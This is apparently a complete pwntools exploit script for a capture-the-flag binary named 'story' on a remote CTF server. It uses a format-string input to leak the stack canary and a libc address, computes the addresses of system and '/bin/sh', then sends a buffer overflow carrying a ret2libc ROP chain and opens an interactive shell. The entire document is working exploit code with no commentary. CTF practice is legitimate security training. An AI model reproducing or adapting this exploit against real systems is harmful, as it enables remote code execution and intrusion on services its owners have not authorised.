from pwn import *

#p = process('./story')
p = remote('ctf3.linkedbyx.com',11045)
elf = ELF('./story')
libc = ELF('./libc.so')

p.recvuntil('Please Tell Your ID:')
p.sendline('%15$p,%25$p')
p.recvuntil('Hello ')
data1 = p.recv(18)
p.recvuntil(',')
data2 = p.recv(14)

data1 = int(data1,16)
data2 = int(data2,16) - 240
print hex(data1),hex(data2)

libc_base = data2 - libc.symbols['__libc_start_main']
system_addr = libc_base + libc.symbols['system']
bin_addr = libc_base + libc.search('/bin/sh').next()

p.recvuntil('Tell me the size of your story:')
p.sendline('144')

p.recvuntil('You can speak your story:')
#gdb.attach(p)
payload = 'A'*136 + p64(data1) + 'A'*8 + p64(0x0000000000400bd3) + p64(bin_addr) + p64(system_addr)
p.sendline(payload)

p.interactive()
